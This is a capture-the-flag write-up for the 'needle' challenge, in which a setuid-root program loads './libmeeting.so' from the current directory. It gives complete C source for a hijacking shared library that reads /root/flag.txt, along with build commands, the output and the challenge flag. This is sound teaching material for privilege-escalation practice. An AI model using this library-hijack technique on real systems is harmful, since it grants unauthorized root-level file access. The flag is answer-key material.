# threadctf - needle

**Flag:** `threadctf{sHoOtin9_50m3_atom1C_FEe7}`

## Task

The bot gives two files (`Meeting.c`, `letter.jpg`) and a container:

```
ssh t.zainullin-needle@osctf.nnk.moe
```

Inside the container home directory there is a **setuid-root** binary `meeting`
(the same `Meeting.c` is attached). The program:

1. Locks mutexes and starts a thread that reads `/root/flag.txt` (it can, because
   the process is setuid root). The flag is **never printed** by the program itself.
2. Loads a library from the current directory: `dlopen("./libmeeting.so", RTLD_NOW)`.
3. Takes the symbol `meeting` from that library and runs it in a new thread.
4. At the end prints the return value of `meeting()`:

```c
pthread_join(meeting_occurence, &name_pointer);
printf("Polythread has your concent and name: %s\n", (char*)name_pointer);
```

## Idea

The program loads **our** `libmeeting.so` from the current working directory and
prints whatever our `meeting()` returns. Because the whole process is setuid
root, our function may simply open `/root/flag.txt` and return its content -
the main thread will print it as the "name".



1. Connect to the container (password from the bot).

2. Create `libmeeting.c`:

```c
#include <stdio.h>
#include <stdlib.h>

void* meeting(void* arg) {
    (void)arg;
    char* buf = calloc(1, 256);
    FILE* f = fopen("/root/flag.txt", "r");
    if (f) {
        if (!fgets(buf, 256, f)) buf[0] = '\0';
        fclose(f);
    }
    return buf;   /* main prints this pointer as the "name" */
}
```

3. Build and run (both in the container, from the home directory):

```
gcc -shared -fPIC -o libmeeting.so libmeeting.c
./meeting
```

Output:

```
Polythread has your concent and name: threadctf{sHoOtin9_50m3_atom1C_FEe7}
```
